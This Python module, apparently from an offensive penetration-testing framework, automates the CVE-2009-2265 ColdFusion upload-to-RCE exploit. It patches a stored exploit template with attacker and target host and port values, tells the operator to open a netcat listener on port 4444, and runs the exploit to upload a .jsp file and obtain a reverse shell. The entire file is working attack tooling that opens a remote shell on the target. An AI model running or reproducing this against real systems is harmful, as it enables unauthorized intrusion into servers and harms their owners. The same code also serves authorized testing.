def run(data, cred, args):
    import subprocess
    from core.target import get_current_url
    from core.attacker import resolve_lhost
    from core.paths import get_tools_dir
    import tempfile
    import uuid
    import re
    import os

    # --- CORE PALETTE ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD, DIM = '\033[1m', '\033[2m'

    # 1. INITIALIZATION & TARGETING
    target_url = get_current_url(data)
    lhost = resolve_lhost(args)
    lport = 4444

    if not target_url or not lhost:
        print(f"{R}[!] PHASE: ABORTED. Missing target configuration.{W}")
        return data

    # Normalize target
    clean_target = target_url.split("://")[1] if "://" in target_url else target_url
    rhost, rport = clean_target.split(":") if ":" in clean_target else (clean_target, "8500")

    # 2. PHASE HEADER
    print(f"\n{B}[*]{W} {BOLD}PHASE: ARTIFACT UPLOAD & RCE (CVE-2009-2265){W}")
    print(f"{B}  ├── {B}Target:{W}   {C}{rhost}:{rport}{W}")
    print(f"{B}  ├── {B}Callback:{W} {G}{lhost}:{lport}{W}")

    # Load and Patch Exploit
    exploit_path = get_tools_dir() / "cves" / "cve_2009_2265.py"
    if not exploit_path.exists():
        print(f"{R}  └── [!] ERROR: Exploit template missing at {exploit_path}{W}")
        return data

    print(f"{B}  └── {B}Status:{W}   {Y}Patching exploit payload...{W}")
    
    with open(exploit_path, "r") as f:
        content = f.read()

    filename = uuid.uuid4().hex
    content = re.sub(r"lhost\s*=\s*['\"].*?['\"]", f"lhost = '{lhost}'", content)
    content = re.sub(r"lport\s*=\s*\d+", f"lport = {lport}", content)
    content = re.sub(r"rhost\s*=\s*['\"].*?['\"]", f"rhost = '{rhost}'", content)
    content = re.sub(r"rport\s*=\s*\d+", f"rport = {rport}", content)
    content = re.sub(r"filename\s*=\s*uuid\.uuid4\(\)\.hex", f"filename = '{filename}'", content)

    # 3. LISTENER ALERT BOX
    print(f"\n{Y}┌── LISTENER MANDATORY ────────────────────────────────────┐{W}")
    print(f"{Y}│{W}  {BOLD}nc -lvnp {lport}{W: <48} {Y}│{W}")
    print(f"{Y}└──────────────────────────────────────────────────────────┘{W}")

    input(f"\n{B}[*]{W} Ready to deploy. Press {BOLD}ENTER{W} to trigger exploit...")

    # 4. EXECUTION TRANSPARENCY
    tmp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".py")
    tmp_file.write(content.encode())
    tmp_file.close()

    print(f"\n{B}[*]{W} Launching payload via patched template...")
    print(f"{B}  └── {B}Command:{W} {Y}python3 {tmp_file.name}{W}")

    try:
        # Running patched exploit
        proc = subprocess.run(["python3", tmp_file.name], capture_output=True, text=True)
        
        if proc.returncode == 0:
            print(f"\n{G}[+] EXPLOIT SENT SUCCESSFULLY{W}")
            print(f"{G}  └── {W}Filename: {BOLD}{filename}.jsp{W}")
            print(f"{G}  └── {W}Check your listener for incoming shell.{W}")
        else:
            print(f"\n{R}[!] EXPLOIT FAILED{W}")
            print(f"{R}  └── {W}{proc.stderr.strip()}{W}")

    except Exception as e:
        print(f"\n{R}[!] SYSTEM ERROR: {e}{W}")
    finally:
        os.unlink(tmp_file.name) # Cleanup

    print(f"\n{C}>> OPERATION DELEGATED TO REVERSE HANDLER.{W}\n")
    return data